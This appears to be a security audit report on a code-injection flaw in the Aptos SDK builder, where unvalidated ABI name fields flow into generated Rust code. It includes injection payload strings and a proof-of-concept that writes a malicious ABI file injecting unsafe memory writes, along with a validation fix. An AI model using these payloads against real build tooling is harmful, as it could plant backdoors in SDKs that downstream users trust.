# Audit Report

## Title
Code Injection Vulnerability in SDK Builder Through Unsanitized ABI Names

## Summary
The Aptos SDK builder (`aptos-sdk-builder`) is vulnerable to arbitrary Rust code injection when processing maliciously crafted ABI files. Function names, argument names, and type parameter names in ABI files are used directly in code generation without validation or sanitization, allowing attackers to inject arbitrary Rust code including `unsafe` blocks that could cause memory safety issues.

## Finding Description

The SDK builder reads ABI files containing Move function metadata and generates Rust code for transaction builders. The ABI structure contains several `String` fields that are deserialized from untrusted input and used directly in code generation: [1](#0-0) [2](#0-1) 

When ABI files are read, they are deserialized directly using BCS without any validation of the name fields: [3](#0-2) 

These unsanitized name strings are then used directly in Rust code generation in multiple locations:

**Function Names (Entry Functions):** [4](#0-3) 

**Function Names (Transaction Scripts):** [5](#0-4) 

**Type Parameter Names:** [6](#0-5) 

**Argument Names:** [7](#0-6) 

**Decoder Functions:** [8](#0-7) 

An attacker can craft a malicious ABI file with names containing special characters, newlines, or Rust syntax to inject arbitrary code. For example, an ABI with function name `"foo() {} pub unsafe fn evil() { std::ptr::write(0 as *mut u8, 42) } pub fn bar"` would generate:

```rust
pub fn foo() {} pub unsafe fn evil() { std::ptr::write(0 as *mut u8, 42) } pub fn bar_script() -> Script {
```

This injects an `unsafe` function with arbitrary memory access into the generated SDK code.

## Impact Explanation

This vulnerability is **High Severity** because:

1. **Arbitrary Code Injection**: Attackers can inject any Rust code into generated SDK libraries, including `unsafe` blocks, external crate imports, or malicious logic.

2. **Memory Safety Violations**: Injected `unsafe` code can violate Rust's memory safety guarantees, potentially causing:
   - Arbitrary memory reads/writes
   - Use-after-free vulnerabilities
   - Data races
   - Undefined behavior

3. **Supply Chain Attack Vector**: Generated SDK code could be distributed to downstream users who trust it, creating a supply chain attack where malicious code is embedded in "official" SDK libraries.

4. **Backdoor Insertion**: Attackers could inject code that leaks private keys, manipulates transaction data, or compromises user funds when the SDK is used.

5. **Wide Impact**: The SDK builder is used to generate client libraries for multiple languages. While this specific vulnerability affects Rust generation, similar patterns exist in the Go generator.

This meets the **High Severity** criteria of "Significant protocol violations" and could potentially escalate to **Critical** if the injected code leads to actual fund theft or RCE on systems using the generated SDK.

## Likelihood Explanation

**Likelihood: High**

The vulnerability is highly likely to be exploitable because:

1. **No Authentication**: ABI files are read from filesystem directories without authentication. Anyone providing ABI files (e.g., via package repositories, documentation examples, or development tools) could inject malicious content.

2. **No Validation**: There is zero validation of ABI name fields. The code uses plain `String` types instead of validated `Identifier` types.

3. **Direct Usage**: Names are used directly in `format!`, `write!`, and `writeln!` macros without escaping or sanitization.

4. **Simple Exploitation**: Creating a malicious ABI file only requires:
   - Understanding BCS serialization format
   - Crafting strings with special characters
   - Running the SDK builder tool

5. **Realistic Attack Scenarios**:
   - Malicious package dependencies providing ABI files
   - Compromised documentation or example repositories
   - Man-in-the-middle attacks on ABI file downloads
   - Insider threats from contributors

## Recommendation

**Immediate Fix**: Validate all ABI name fields to ensure they are valid identifiers before using them in code generation.

Add validation in the `read_abis` function:

```rust
pub fn read_abis(dir_paths: &[impl AsRef<Path>]) -> anyhow::Result<Vec<EntryABI>> {
    let mut abis = Vec::<EntryABI>::new();
    for dir in dir_paths.iter() {
        for path in get_abi_paths(dir.as_ref())? {
            let mut buffer = Vec::new();
            let mut f = std::fs::File::open(path)?;
            f.read_to_end(&mut buffer)?;
            let abi: EntryABI = bcs::from_bytes(&buffer)?;
            
            // Validate all names are valid identifiers
            validate_abi_names(&abi)?;
            
            abis.push(abi);
        }
    }
    // ... rest of function
}

fn validate_abi_names(abi: &EntryABI) -> anyhow::Result<()> {
    use move_core_types::identifier::Identifier;
    
    // Validate function name
    Identifier::is_valid(abi.name())
        .then_some(())
        .ok_or_else(|| anyhow::anyhow!("Invalid function name: {}", abi.name()))?;
    
    // Validate type argument names
    for ty_arg in abi.ty_args() {
        Identifier::is_valid(ty_arg.name())
            .then_some(())
            .ok_or_else(|| anyhow::anyhow!("Invalid type argument name: {}", ty_arg.name()))?;
    }
    
    // Validate argument names
    for arg in abi.args() {
        Identifier::is_valid(arg.name())
            .then_some(())
            .ok_or_else(|| anyhow::anyhow!("Invalid argument name: {}", arg.name()))?;
    }
    
    Ok(())
}
```

**Long-term Fix**: Change ABI structure to use `Identifier` type instead of `String` for all name fields, enforcing validation at deserialization time.

## Proof of Concept

```rust
// Create a malicious ABI file demonstrating code injection
use aptos_types::transaction::{EntryABI, EntryFunctionABI, ArgumentABI, TypeArgumentABI};
use move_core_types::language_storage::{ModuleId, TypeTag};
use move_core_types::account_address::AccountAddress;
use move_core_types::identifier::Identifier;

fn create_malicious_abi() -> EntryABI {
    // Malicious function name that injects unsafe code
    let malicious_name = "transfer() {} pub unsafe fn inject() { \
        let ptr = 0x1234 as *mut u64; \
        std::ptr::write(ptr, 0xdeadbeef); \
    } pub fn fake".to_string();
    
    let abi = EntryFunctionABI::new(
        malicious_name,
        ModuleId::new(
            AccountAddress::ONE,
            Identifier::new("coin").unwrap()
        ),
        "Malicious ABI".to_string(),
        vec![],
        vec![],
    );
    
    EntryABI::EntryFunction(abi)
}

fn main() {
    let abi = create_malicious_abi();
    
    // Serialize to BCS
    let serialized = bcs::to_bytes(&abi).unwrap();
    
    // Write to file
    std::fs::write("malicious.abi", serialized).unwrap();
    
    println!("Created malicious.abi");
    println!("Run: cargo run -p aptos-sdk-builder -- malicious_dir/");
    println!("The generated code will contain injected unsafe code");
}

// Expected generated output will be:
// pub fn coin_transfer() {} pub unsafe fn inject() { 
//     let ptr = 0x1234 as *mut u64; 
//     std::ptr::write(ptr, 0xdeadbeef); 
// } pub fn fake_transfer(...) -> TransactionPayload {
//     ...
// }
```

This PoC demonstrates that a malicious ABI file can inject arbitrary `unsafe` Rust code with memory writes into the generated SDK, directly answering the security question: **Yes, malicious ABIs can cause generation of unsafe Rust code with memory safety issues.**

## Notes

The vulnerability affects the Rust code generator specifically. The Go generator (`golang.rs`) should also be audited for similar issues. Module names are safe because they use the `Identifier` type in `ModuleId`, which enforces validation. However, all other name fields in ABIs are vulnerable.

### Citations

**File:** third_party/move/move-core/types/src/abi.rs (L29-42)
```rust
#[derive(Clone, Debug, Hash, Eq, PartialEq, Serialize, Deserialize)]
pub struct TransactionScriptABI {
    /// The public name of the script.
    name: String,
    /// Some text comment.
    doc: String,
    /// The `code` value to set in the `Script` object.
    #[serde(with = "serde_bytes")]
    code: Vec<u8>,
    /// The names of the type arguments.
    ty_args: Vec<TypeArgumentABI>,
    /// The description of regular arguments.
    args: Vec<ArgumentABI>,
}
```

**File:** third_party/move/move-core/types/src/abi.rs (L45-59)
```rust
#[derive(Clone, Debug, Hash, Eq, PartialEq, Serialize, Deserialize)]
pub struct ArgumentABI {
    /// The name of the argument.
    name: String,
    /// The expected type.
    /// In Move scripts, this does contain generics type parameters.
    type_tag: TypeTag,
}

/// The description of a type argument in a script.
#[derive(Clone, Debug, Hash, Eq, PartialEq, Serialize, Deserialize)]
pub struct TypeArgumentABI {
    /// The name of the argument.
    name: String,
}
```

**File:** aptos-move/aptos-sdk-builder/src/lib.rs (L30-39)
```rust
pub fn read_abis(dir_paths: &[impl AsRef<Path>]) -> anyhow::Result<Vec<EntryABI>> {
    let mut abis = Vec::<EntryABI>::new();
    for dir in dir_paths.iter() {
        for path in get_abi_paths(dir.as_ref())? {
            let mut buffer = Vec::new();
            let mut f = std::fs::File::open(path)?;
            f.read_to_end(&mut buffer)?;
            abis.push(bcs::from_bytes(&buffer)?);
        }
    }
```

**File:** aptos-move/aptos-sdk-builder/src/rust.rs (L441-455)
```rust
    fn emit_transaction_script_encoder_function(
        &mut self,
        abi: &TransactionScriptABI,
    ) -> Result<()> {
        write!(
            self.out,
            "pub fn {}_script({}) -> Script {{",
            abi.name(),
            [
                Self::quote_type_parameters(abi.ty_args()),
                Self::quote_parameters(abi.args(), self.local_types),
            ]
            .concat()
            .join(", ")
        )?;
```

**File:** aptos-move/aptos-sdk-builder/src/rust.rs (L489-501)
```rust
    fn emit_entry_function_encoder_function(&mut self, abi: &EntryFunctionABI) -> Result<()> {
        write!(
            self.out,
            "pub fn {}_{}({}) -> TransactionPayload {{",
            abi.module_name().name().to_string().to_snake_case(),
            abi.name(),
            [
                Self::quote_type_parameters(abi.ty_args()),
                Self::quote_parameters(abi.args(), self.local_types),
            ]
            .concat()
            .join(", ")
        )?;
```

**File:** aptos-move/aptos-sdk-builder/src/rust.rs (L582-599)
```rust
        for (index, ty_arg) in abi.ty_args().iter().enumerate() {
            writeln!(
                self.out,
                "{} : script.ty_args{}.get({})?.clone(),",
                ty_arg.name(),
                if self.local_types { "()" } else { "" },
                index,
            )?;
        }
        for (index, arg) in abi.args().iter().enumerate() {
            writeln!(
                self.out,
                "{} : bcs::from_bytes(script.args{}.get({})?).ok()?,",
                arg.name(),
                if self.local_types { "()" } else { "" },
                index,
            )?;
        }
```

**File:** aptos-move/aptos-sdk-builder/src/rust.rs (L823-828)
```rust
    fn quote_type_parameters(ty_args: &[TypeArgumentABI]) -> Vec<String> {
        ty_args
            .iter()
            .map(|ty_arg| format!("{}: TypeTag", ty_arg.name()))
            .collect()
    }
```

**File:** aptos-move/aptos-sdk-builder/src/rust.rs (L830-840)
```rust
    fn quote_parameters(args: &[ArgumentABI], local_types: bool) -> Vec<String> {
        args.iter()
            .map(|arg| {
                format!(
                    "{}: {}",
                    arg.name(),
                    Self::quote_type(arg.type_tag(), local_types)
                )
            })
            .collect()
    }
```
